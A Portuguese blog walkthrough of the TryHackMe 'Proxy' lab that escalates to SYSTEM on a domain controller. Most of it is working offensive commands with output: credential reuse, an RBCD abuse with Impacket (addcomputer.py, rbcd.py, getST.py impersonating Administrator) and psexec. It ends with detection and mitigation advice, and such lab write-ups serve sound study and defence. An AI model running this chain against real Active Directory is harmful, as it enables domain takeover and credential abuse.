---
layout: post
title: "Proxy - Do Credential Reuse ao SYSTEM no Domain Controller (RBCD)"
description: "Walkthrough TryHackMe Proxy: enumeração AD, KeePass, senha reutilizada, BloodHound, AddAllowedToAct, RBCD, S4U2Proxy, Pass-the-Ticket e PsExec."
date: 2026-10-25
categories: [walkthrough]
tags: [windows, tryhackme, proxy, active-directory, credential-reuse, keepass, bloodhound, acl, rbcd, kerberos, impacket, s4u2proxy, pass-the-ticket, psexec]
---

# Proxy - Do Credential Reuse ao SYSTEM no Domain Controller (RBCD)

Nesta room do TryHackMe, parti de uma conta comum do domínio Windows e terminei com **SYSTEM no Domain Controller**. O caminho não foi uma vulnerabilidade do kernel nem a senha do Administrator: foi a combinação de **reutilização de senha, uma ACL específica e delegação Kerberos**.

Organizei o que realmente funcionou e os desvios que ensinaram quando insistir em uma pista e quando voltar à enumeração.

> Ambiente de laboratório autorizado. IPs e credenciais são desta execução do TryHackMe; mudam após reset. Alguns comandos alteram objetos do Active Directory.

<a id="indice"></a>

## Índice

| Etapa | Conteúdo |
|---|---|
| Reconhecimento | [1. Mapa](#mapa) · [2. Identificar DC e acesso](#reconhecimento) · [3. Enumerar usuários](#enumeracao) |
| Descoberta | [4. KeePass e Credential Reuse](#reuso) · [5. BloodHound e ACL](#bloodhound) |
| Escalação | [6. Pré-requisitos](#requisitos) · [7. Configurar RBCD](#rbcd) · [8. Tickets S4U](#tickets) · [9. SMB e SYSTEM](#system) |
| Referência | [10. Desvios](#desvios) · [11. Ferramentas](#ferramentas) · [12. Diagnóstico](#diagnostico) · [13. Checklist](#checklist) · [14. Defesa](#defesa) |

<a id="mapa"></a>

## 1. Contexto e mapa da room

| Item | Valor |
|---|---|
| Domínio | <code>ctf.local</code> |
| DC | <code>DC01.ctf.local</code>, IP <code>10.64.163.15</code> |
| SO | Windows Server 2019, build 17763 |
| Acesso inicial deste percurso | <code>j.smith</code> |
| Conta que permitiu escalar | <code>r.williams</code> |
| Objetivo confirmado | Administrator via CIFS, shell SYSTEM |

~~~text
j.smith (usuário comum)
       |
       +--> KeePass --> Helpdesk01!
                            |
                    Credential Reuse
                            v
                        r.williams
                            |
                 AddAllowedToAct em DC01$
                            |
                 MachineAccountQuota = 10
                            |
                         LABPC01$
                            |
                    RBCD no DC01$
                            |
                    S4U2Self/Proxy
                            |
                Ticket CIFS/Administrator
                            |
                SMB (Pwn3d!) + PsExec
                            |
                         SYSTEM
~~~

Na investigação inicial também encontrei o share <code>IT-Shared</code> acessível para Guest (READ/WRITE), e uma automação que executava scripts como <code>CTF\svc.scanner</code>. Foram pistas reais, mas **não vou inventar a ligação entre elas e a obtenção de j.smith**: a cadeia reproduzível abaixo começa com essa conta disponível.

<a id="reconhecimento"></a>

## 2. Identificar o DC e validar acesso

### 2.1 Nmap: procurar os serviços certos

~~~bash
DC_IP=10.64.163.15

nmap -Pn -sT -sV --version-light \
  -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 \
  "$DC_IP"
~~~

Principais resultados:

~~~text
53/tcp DNS       88/tcp Kerberos     389/tcp LDAP
445/tcp SMB      3268/tcp GC        3389/tcp RDP
5985/tcp WinRM   9389/tcp ADWS       Host: DC01
Domain: ctf.local
~~~

| Opção | Função |
|---|---|
| <code>-Pn</code> | Não depende de ping para iniciar a varredura |
| <code>-sT</code> | TCP Connect |
| <code>-sV</code> | Detecção de serviço/versão |
| <code>--version-light</code> | Testes de versão menos intensivos |
| <code>-p</code> | Portas selecionadas |

DNS, LDAP, Kerberos e SMB, junto aos detalhes do host, identificaram o Domain Controller. **Porta aberta não significa vulnerabilidade.** E <code>-Pn</code> não prova que todos os endereços escaneados estão ativos.

### 2.2 Validar credenciais

~~~bash
nxc smb "$DC_IP" -d ctf.local -u j.smith -p 'JSmith@IT2024'
nxc rdp "$DC_IP" -d ctf.local -u j.smith -p 'JSmith@IT2024'
~~~

SMB e RDP aceitaram a conta. Para abrir uma sessão:

~~~bash
xfreerdp /v:"$DC_IP" /u:j.smith /d:ctf.local \
  /p:'JSmith@IT2024' /cert:ignore /dynamic-resolution
~~~

O NetExec serve para validar autenticação; o FreeRDP permite explorar os arquivos e ferramentas do Windows. **Não confunda login RDP com privilégios administrativos**, mesmo quando a ferramenta exibe mensagens chamativas.

<a id="enumeracao"></a>

## 3. Enumerar usuários e descobrir contas relevantes

Com um domínio identificado e credencial válida, prefiro obter contexto sobre usuários antes de tentar exploits locais.

~~~bash
nxc smb "$DC_IP" -d ctf.local \
  -u j.smith -p 'JSmith@IT2024' --users
~~~

LDAP retorna descrição e grupos:

~~~bash
ldapsearch -x -LLL -H "ldap://$DC_IP" \
  -D 'j.smith@ctf.local' -W \
  -b 'DC=ctf,DC=local' \
  '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName description memberOf
~~~

| Opção | Explicação |
|---|---|
| <code>-x</code> | Bind LDAP simples |
| <code>-LLL</code> | Saída limpa |
| <code>-D</code> / <code>-W</code> | Conta e solicitação de senha |
| <code>-b</code> | Base de busca no domínio |
| <code>sAMAccountName</code> | Login |
| <code>description</code> / <code>memberOf</code> | Descrição e grupos |

Para investigar o usuário interessante:

~~~bash
ldapsearch -x -LLL -H "ldap://$DC_IP" \
  -D 'j.smith@ctf.local' -W \
  -b 'DC=ctf,DC=local' \
  '(sAMAccountName=r.williams)' \
  sAMAccountName memberOf description displayName
~~~

Retorno:

~~~text
description: Help Desk Senior
memberOf: CN=sysadmin,CN=Users,DC=ctf,DC=local
memberOf: CN=Remote Desktop Users,CN=Builtin,DC=ctf,DC=local
sAMAccountName: r.williams
~~~

A descrição *Help Desk Senior* e o grupo personalizado <code>sysadmin</code> justificaram investigar a conta. **O nome do grupo não prova que ela é Domain Admin.** O que vale são as permissões efetivas.

<a id="reuso"></a>

## 4. KeePass e Credential Reuse

Durante o acesso autenticado, identifiquei um banco KeePass:

~~~text
C:\Users\j.smith\Documents\Database.kdbx
~~~

Em outras rooms, procuro arquivos desse tipo nas pastas que posso ler, sem varrer o disco inteiro:

~~~powershell
Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter '*.kdbx' -File -ErrorAction SilentlyContinue
~~~

> Um arquivo <code>.kdbx</code> é protegido. Encontrá-lo não significa conseguir descriptografá-lo. A investigação permitiu obter a senha <code>Helpdesk01!</code>; como não registrei o método de desbloqueio, não vou inventar essa etapa.

Com uma senha relacionada a HelpDesk e uma conta *Help Desk Senior*, testei **uma hipótese pontual de reutilização**:

~~~bash
nxc smb "$DC_IP" -d ctf.local \
  -u r.williams -p 'Helpdesk01!'
~~~

Resultado confirmado:

~~~text
[+] ctf.local\r.williams:Helpdesk01!
~~~

**Esse foi o pivot real da room.** Em vez de tentar milhões de senhas, utilizei informação já obtida em uma conta relacionada.

Acessei a sessão dessa conta:

~~~bash
xfreerdp /v:"$DC_IP" /u:r.williams /d:ctf.local \
  /p:'Helpdesk01!' /cert:ignore /dynamic-resolution
~~~

No Windows:

~~~powershell
whoami
whoami /groups
whoami /priv
~~~

O token não mostrava <code>SeDebugPrivilege</code> ou <code>SeImpersonatePrivilege</code>. Porém **um usuário sem privilégios locais elevados pode ter direitos de escrita relevantes no Active Directory**.

<a id="bloodhound"></a>

## 5. BloodHound e confirmação da ACL

A AttackBox já tinha **BloodHound Legacy** (Electron + Neo4j), diferente do BloodHound CE. Usei o coletor compatível com Legacy.

~~~bash
pipx install bloodhound

cd /root/reports

/root/.local/bin/bloodhound-python \
  -u r.williams -p 'Helpdesk01!' \
  -d ctf.local \
  -dc dc01.ctf.local \
  -gc dc01.ctf.local \
  -ns 10.64.163.15 \
  --dns-tcp --dns-timeout 15 \
  -c DCOnly --zip
~~~

Importei o ZIP no BloodHound, marquei <code>R.WILLIAMS@CTF.LOCAL</code> como **Owned** e procurei caminhos para objetos críticos. A relação encontrada foi:

~~~text
R.WILLIAMS@CTF.LOCAL
       |
       | AddAllowedToAct
       v
DC01.CTF.LOCAL
~~~

Consulta Cypher para isolar o relacionamento:

~~~cypher
MATCH p=(u:User {name:'R.WILLIAMS@CTF.LOCAL'})
  -[:AddAllowedToAct]->(c:Computer {name:'DC01.CTF.LOCAL'})
RETURN p
~~~

A seção **Windows Abuse** do BloodHound explica a relação; para ter certeza, conferi a ACE no AD.

~~~powershell
Import-Module ActiveDirectory

$dn = (Get-ADComputer DC01).DistinguishedName

(Get-Acl "AD:\$dn").Access |
  Where-Object {
    $_.IdentityReference -match 'r\.williams|sysadmin'
  } |
  Select-Object IdentityReference,ActiveDirectoryRights,ObjectType,IsInherited |
  Format-List
~~~

Resultado real:

~~~text
IdentityReference     : CTF\r.williams
ActiveDirectoryRights : WriteProperty
ObjectType            : 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79
IsInherited           : False
~~~

O GUID <code>3f78c3e5-f79a-46bd-a0b8-9d18116ddc79</code> identifica o atributo <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>, relacionado à **Resource-Based Constrained Delegation (RBCD)**.

| Conceito | Significado |
|---|---|
| **ACL / ACE** | Lista de permissões / entrada específica |
| **WriteProperty** | Direito de escrever uma propriedade do objeto |
| **AddAllowedToAct** | Relação BloodHound para configurar RBCD |
| **RBCD** | O recurso de destino controla quais identidades podem atuar em seu nome |
| **DC01$** | Conta de máquina do Domain Controller |

**Conclusão da enumeração:** <code>r.williams</code> não precisava ser Domain Admin: tinha direito de escrita no atributo preciso que controla a delegação no objeto <code>DC01$</code>.


<a id="requisitos"></a>

## 6. Pré-requisitos: por que RBCD seria possível?

Além da permissão <code>AddAllowedToAct</code>, precisava de uma conta de serviço/computador sob controle.

~~~powershell
Get-ADObject -Identity 'DC=ctf,DC=local' -Properties 'ms-DS-MachineAccountQuota' |
  Select-Object -ExpandProperty 'ms-DS-MachineAccountQuota'
~~~

Resultado: <code>10</code>. Essa é a cota padrão para criação de computadores; ainda foi necessário confirmar a criação de fato.

O exemplo <code>New-MachineAccount</code> mostrado pelo BloodHound é do **Powermad** (PowerShell). O <code>addcomputer.py</code> realiza a etapa equivalente pelo Impacket (Linux). Verifique a versão instalada com <code>addcomputer.py -h</code>, não copie parâmetros incompletos de uma página.

<a id="rbcd"></a>

## 7. Conta de computador e configuração RBCD

Na AttackBox:

~~~bash
addcomputer.py \
  -dc-ip 10.64.163.15 \
  -dc-host DC01.ctf.local \
  -computer-name 'LABPC01$' \
  -computer-pass 'LabPC2026!Strong' \
  'ctf.local/r.williams:Helpdesk01!'
~~~

Retorno: <code>Successfully added machine account LABPC01$</code>.

| Parâmetro | Função |
|---|---|
| <code>-computer-name</code> | Nome da conta de máquina criada |
| <code>-computer-pass</code> | Senha sob nosso controle |
| <code>-dc-ip</code> / <code>-dc-host</code> | Identificam o DC |
| <code>domínio/usuário:senha</code> | Conta que solicita a criação |

O <code>$</code> final é típico das contas de máquina.

Para configurar a delegação no objeto <code>DC01$</code>:

~~~bash
rbcd.py \
  -dc-ip 10.64.163.15 \
  -action write \
  -delegate-from 'LABPC01$' \
  -delegate-to 'DC01$' \
  'ctf.local/r.williams:Helpdesk01!'
~~~

Resultado: <code>Delegation rights modified successfully!</code>.

<code>-delegate-from</code> identifica a conta autorizada a delegar. <code>-delegate-to</code> é o recurso de destino. **A escrita modifica um atributo sensível no AD.**

Conferência:

~~~bash
rbcd.py \
  -dc-ip 10.64.163.15 \
  -action read \
  -delegate-to 'DC01$' \
  'ctf.local/r.williams:Helpdesk01!'
~~~

Resultado: <code>LABPC01$</code> apareceu autorizada no objeto <code>DC01$</code>.


<a id="tickets"></a>

## 8. S4U2Self, S4U2Proxy e Pass-the-Ticket

| Conceito | Significado |
|---|---|
| **TGT** | Ticket para pedir outros tickets ao KDC |
| **TGS** | Ticket destinado a um serviço específico |
| **SPN** | Identificador Kerberos de serviço, como <code>cifs/DC01.ctf.local</code> |
| **S4U2Self** | Serviço solicita ticket representando outro usuário |
| **S4U2Proxy** | Obtém ticket para o serviço de destino, conforme a delegação |
| **ccache** | Arquivo de cache Kerberos usado pelo Linux |

Agora que a delegação estava configurada, solicitei um **ticket CIFS para Administrator**, autenticando como a máquina que eu controlava:

~~~bash
cd /root/reports

getST.py \
  -spn 'cifs/DC01.ctf.local' \
  -impersonate Administrator \
  -dc-ip 10.64.163.15 \
  'ctf.local/LABPC01$:LabPC2026!Strong'
~~~

Resultado:

~~~text
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
~~~

<code>-spn</code> define o serviço; <code>-impersonate</code>, a identidade representada; <code>-dc-ip</code>, o KDC. Um aviso <code>CCache file is not found. Skipping...</code> não impediu o sucesso, porque a ferramenta obteve o TGT necessário.

Ativei o cache para os próximos comandos:

~~~bash
export KRB5CCNAME="$PWD/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache"
klist -c "$KRB5CCNAME"
~~~

Saída comprovada:

~~~text
Default principal: Administrator@ctf.local
Valid starting: 10/25/26 15:04:34
Expires:        10/26/26 01:04:34
Service:        cifs/DC01.ctf.local@CTF.LOCAL
~~~

<code>export</code> define uma variável de ambiente no shell e nos processos filhos: **não modifica o ticket, não o renova e não instala nada no Windows**. Esse cache continha um **ticket CIFS**, não a senha ou um TGT universal de Administrator.

<a id="system"></a>

## 9. Acesso administrativo, PsExec e flag

Validar o ticket no SMB:

~~~bash
nxc smb DC01.ctf.local \
  -d ctf.local \
  -u Administrator \
  -k --use-kcache
~~~

Resultado:

~~~text
[+] ctf.local\Administrator from ccache (Pwn3d!)
~~~

Depois, obter shell remoto:

~~~bash
psexec.py -k -no-pass \
  -dc-ip 10.64.163.15 \
  ctf.local/Administrator@DC01.ctf.local
~~~

O Impacket encontrou <code>ADMIN$</code> gravável, enviou um executável temporário e criou/iniciou um serviço pelo **Service Control Manager**. PsExec **deixa artefatos de serviço**, não é uma simples consulta.

No prompt remoto:

~~~cmd
whoami
whoami /priv
hostname
~~~

Resposta:

~~~text
nt authority\system
SeDebugPrivilege        Enabled
SeImpersonatePrivilege  Enabled
DC01
~~~

**Distinção importante:** a autenticação usou um ticket de <code>Administrator</code>, mas o executável de serviço criado pelo PsExec rodou como <code>LocalSystem</code>. Por isso o shell ficou como SYSTEM.

A flag:

~~~cmd
cd C:\Users\Administrator\Desktop
type flag.txt
~~~

~~~text
THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
~~~

**Resultado comprovado:** RBCD aceita, ticket S4U emitido, autenticação administrativa SMB, execução remota como SYSTEM e flag encontrada.


<a id="desvios"></a>

## 10. Caminhos investigados que não avançaram

Não é necessário repetir todos os erros, mas é útil registrar **por que uma hipótese foi abandonada**.

| Pista | Evidência encontrada | Por que não resolvia |
|---|---|---|
| **Kerberoasting: svc.helpdesk** | TGS <code>$krb5tgs$23$</code>; Hashcat <code>-m 13100</code> com rockyou não recuperou senha | Material de cracking não equivale a senha ou sessão |
| **svc.mssql** | Conta de serviço com SPNs MSSQL e associação a Backup Operators | Pista interessante, sem cadeia comprovada |
| **Delegação tradicional** | <code>svc.helpdesk</code> tinha <code>TrustedToAuthForDelegation=True</code>, mas lista <code>msDS-AllowedToDelegateTo</code> vazia | Não identificamos um caminho de delegação utilizável |
| **Mimikatz** | <code>privilege::debug</code> falhou; <code>sekurlsa::logonpasswords</code> retornou acesso negado | Sessão comum não tinha privilégios para ler LSASS |
| **PrivescCheck / WES-NG / Spooler** | Permissões e possíveis CVEs em build antigo | Hipótese ou CVE listado não é exploração confirmada |
| **Tarefa de HelpDesk** | Eventos 129/200 mostraram <code>\HelpDesk\HelpDesk-TicketRenewal</code>; <code>schtasks</code> não a listou | Não consegui demonstrar escrita ou execução controlável |
| **IT-Shared / svc.scanner** | Share Guest e scanner de scripts executados periodicamente | Achados da investigação, mas não constituíram a cadeia RBCD |
| **Ticket antigo de svc.helpdesk** | KRB-CRED no arquivo <code>HelpDesk-Auth.b64</code> | TGT expirado, sem renovação possível em outubro de 2026 |

### 10.1 Por que o arquivo HelpDesk-Auth.b64 não serviu?

No Desktop de <code>r.williams</code>, um aviso dizia que a automação HelpDesk executava periodicamente e mantinha temporários em <code>C:\Windows\Temp</code>. Havia o arquivo <code>HelpDesk-Auth.b64</code>, legível por <code>r.williams</code>.

Os primeiros bytes Base64 decodificados indicaram formato **KRB-CRED**. Depois da conversão para <code>.ccache</code>:

~~~bash
ticketConverter.py HelpDesk-Auth.kirbi HelpDesk-Auth.ccache
klist -c HelpDesk-Auth.ccache
~~~

O cache era de <code>svc.helpdesk@CTF.LOCAL</code>, para <code>krbtgt/ctf.local</code>. Portanto **TGT**, não hash Kerberoasting.

~~~text
Início:      20/05/2026
Expiração:   21/05/2026
Renovação:   até 27/05/2026
~~~

A execução da room foi em **25/10/2026**. Converter formato de arquivo não restaura a validade de um ticket expirado.

### 10.2 Como identifiquei a tarefa mesmo sem acesso direto?

~~~powershell
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-TaskScheduler/Operational'
  Id=129,200
  StartTime=(Get-Date).AddDays(-1)
} | Where-Object {
  $_.Message -match 'HelpDesk|powershell'
} | Select-Object TimeCreated,Id,Message | Format-List
~~~

Os eventos expuseram a execução de <code>\HelpDesk\HelpDesk-TicketRenewal</code>, mas o comando <code>schtasks.exe /query</code> retornou que não localizava o caminho. **Não ver uma tarefa em uma ferramenta não prova que ela nunca existiu**; permissões e ciclo de vida podem mudar a visibilidade.

### 10.3 Aprendizado do desvio

Se já tenho uma credencial válida, não preciso começar sempre por CVEs, Mimikatz ou cracking. No AD, **grupos, ACLs e relações** podem oferecer um caminho muito mais direto.

<a id="ferramentas"></a>

## 11. Ferramentas: quando usar e como interpretar

| Ferramenta | Serve para | Limitação |
|---|---|---|
| **Nmap** | Serviços e portas | Serviço exposto não prova falha |
| **NetExec** | Validar credenciais e privilégios de rede | Resultado depende do protocolo |
| **LDAP / módulo AD** | Contas, grupos, atributos e políticas | Permissões e escopo de busca importam |
| **BloodHound** | Relacionamentos entre objetos e identidades | Precisa confirmar ACL e pré-requisitos |
| **addcomputer.py** | Criar uma conta de máquina | Muda o domínio; pode falhar por ACL/cota |
| **rbcd.py** | Ler ou escrever delegação RBCD | A ação <code>write</code> altera segurança |
| **getST.py** | Emitir ticket Kerberos para serviço/S4U | Requer SPN e delegação válidos |
| **klist** | Inspecionar principal, SPN e datas | Não testa se serviço aceita o ticket |
| **psexec.py** | Execução remota administrativa | Usa compartilhamento e cria serviço |

### Operadores e parâmetros frequentes

| Sintaxe | Significado |
|---|---|
| Barra <code>\</code> ao final da linha Bash | Continua o comando; não pode haver espaços depois |
| Crase PowerShell | Continuação de linha em scripts PowerShell |
| <code>$</code> em <code>LABPC01$</code> | Parte do nome da conta de máquina |
| <code>-k</code> | Autenticação Kerberos |
| <code>-no-pass</code> | Não solicita senha |
| <code>--use-kcache</code> | Usa o cache Kerberos no NetExec |
| <code>-action read/write</code> | Consultar/alterar RBCD |
| <code>-impersonate</code> | Identidade representada no fluxo S4U |
| <code>export KRB5CCNAME=...</code> | Variável de ambiente que aponta para o cache |

**Erro comum no Linux:** <code>command not found</code> não quer dizer necessariamente que o software não existe. Verifique <code>command -v ferramenta</code>, <code>type -a ferramenta</code>, <code>pipx list</code> e possíveis nomes <code>impacket-ferramenta</code>. No laboratório havia instalações gerenciadas por <code>pyenv</code> e <code>pipx</code>, e a VM zerava após reset.


<a id="diagnostico"></a>

## 12. Se não encontrar nada, onde procurar?

### Credencial válida, mas sem caminho de privilégio

No Windows:

~~~powershell
whoami /all
Get-ADUser r.williams -Properties Description,MemberOf |
  Select-Object SamAccountName,Description,MemberOf
Get-ADComputer -Filter * -Properties DNSHostName |
  Select-Object Name,DNSHostName
~~~

Depois, no BloodHound:

1. Marque como **Owned** só as contas realmente controladas.
2. Procure caminhos até objetos importantes, não apenas até grupos com nomes interessantes.
3. Analise permissões como <code>GenericAll</code>, <code>GenericWrite</code>, <code>WriteDacl</code> e <code>AddAllowedToAct</code>.
4. Confirme a ACE no AD. Relações como <code>Contains</code> indicam estrutura, não privilégio explorável.

### BloodHound não resolve o DC/LDAP

~~~bash
dig @10.64.163.15 dc01.ctf.local A +short
nc -vz -w 3 10.64.163.15 389
type -a bloodhound-python
pipx list
~~~

O erro <code>Failed to resolve LDAP server IP</code> apareceu mesmo após editar <code>/etc/hosts</code>: o coletor faz consultas DNS próprias. Confira os argumentos <code>-dc</code>, <code>-gc</code>, <code>-ns</code> e <code>--dns-tcp</code>, e confirme **qual instalação** do Python está executando.

### BloodHound aponta direito, mas eu não consigo usar

Consulte o objeto real e a ACL correspondente:

~~~powershell
$dn = (Get-ADComputer DC01).DistinguishedName
(Get-Acl "AD:\$dn").Access |
  Select-Object IdentityReference,ActiveDirectoryRights,ObjectType,IsInherited
~~~

Observe se o direito é **herdado, específico a um atributo ou concedido a um grupo**. Uma aresta no grafo não substitui a validação.

### Ticket foi emitido, mas SMB falha

~~~bash
echo "$KRB5CCNAME"
klist -c "$KRB5CCNAME"
getent hosts DC01.ctf.local
~~~

Verifique **data/horário, principal, SPN, hostname exato e resolução DNS**. Um ticket <code>cifs/DC01</code> é específico daquele serviço e host, não de qualquer protocolo da rede.

**Regra de estudo:** diferenciar *indício → permissão confirmada → técnica executada → impacto demonstrado*. Isso evita confundir hipótese de CVE com acesso obtido.

<a id="checklist"></a>

## 13. Checklist reutilizável para futuras rooms AD

| Fase | O que procurar | Ferramenta |
|---|---|---|
| 1. Escopo | Hosts, domínio, controlador, DNS | Nmap, registros SRV |
| 2. Autenticação | Contas e serviços onde o login funciona | NetExec, RDP |
| 3. Enumeração | Usuários, descrições, grupos, SPNs | LDAP, AD PowerShell |
| 4. Credenciais | Arquivos de configuração e bancos acessíveis | Busca restrita a pastas legíveis |
| 5. Reutilização | Senhas já obtidas em contas relacionadas | Uma validação pontual; conferir lockout |
| 6. Relações AD | ACLs e caminhos de controle | BloodHound + <code>Get-Acl</code> |
| 7. Pré-requisitos | MAQ, delegação, conta de máquina controlada | Atributos AD, Impacket |
| 8. Execução | Alteração confirmada e ticket obtido | <code>rbcd.py</code>, <code>getST.py</code> |
| 9. Evidência | Ticket aceito e contexto do shell | <code>klist</code>, <code>nxc</code>, <code>whoami</code> |
| 10. Documentação | Comandos, saídas, aprendizados e limites | Notas do exercício |

**O que mais economiza tempo:** antes de tentar escalar com exploit local, pergunto se **minha conta já pode modificar algum objeto importante do domínio**.

<a id="defesa"></a>

## 14. Detecção, mitigação e referências

Três condições facilitaram a escalação:

- **Senha reutilizada:** o segredo relacionado a HelpDesk autenticou em <code>r.williams</code>.
- **Permissão excessiva no DC:** <code>r.williams</code> podia modificar o atributo RBCD de <code>DC01$</code>.
- **MachineAccountQuota = 10:** permitiu criar uma conta de máquina controlada.

Em um ambiente real, as medidas centrais seriam: exigir senhas distintas e gestão de segredos; revisar delegações e ACEs dos controladores de domínio; evitar permissões de escrita RBCD desnecessárias; limitar ingresso/criação de computadores; avaliar <code>MachineAccountQuota=0</code> se o ingresso for gerenciado, sem depender só dessa configuração.

### Eventos que merecem correlação

| Event ID | O que investigar |
|---|---|
| **4741** | Nova conta de computador |
| **5136** | Modificação de objeto no AD, incluindo possível alteração de atributo RBCD |
| **4769** | Requisições Kerberos de ticket de serviço |
| **4624** | Logon no host |
| **7045** | Serviço instalado remotamente, compatível com o comportamento PsExec |

A visibilidade depende de auditoria habilitada. Um evento isolado não prova comprometimento. Uma sequência **nova máquina → alteração RBCD → tickets incomuns → SMB administrativo → novo serviço** merece atenção.

### Material complementar

- [Meu guia: Active Directory — Enumeração e Autenticação](https://github.com/redp4w/redp4w.github.io/blob/main/_posts/2026-10-19-ad-authenticated-enumeration.md)
- [Meu walkthrough: Checkmate — Quebrando senhas!](https://github.com/redp4w/redp4w.github.io/blob/main/_posts/2026-10-03-checkmate.md)
- [Impacket — addcomputer.py](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)
- [Impacket — rbcd.py](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [Impacket — getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py)
- [Microsoft — Evento 4741: computer account created](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4741)
- [Australian Cyber Security Centre — Active Directory compromises](https://www.cyber.gov.au/publication/detecting-and-mitigating-active-directory-compromises)

---

**O principal aprendizado da Proxy:** Active Directory não é apenas senha e grupo administrativo. **Relações entre objetos** também concedem poder. Neste laboratório, uma credencial reutilizada deu acesso a uma ACE específica; o RBCD transformou essa permissão em um ticket Kerberos válido; o SMB e o PsExec confirmaram o impacto com SYSTEM no Domain Controller.
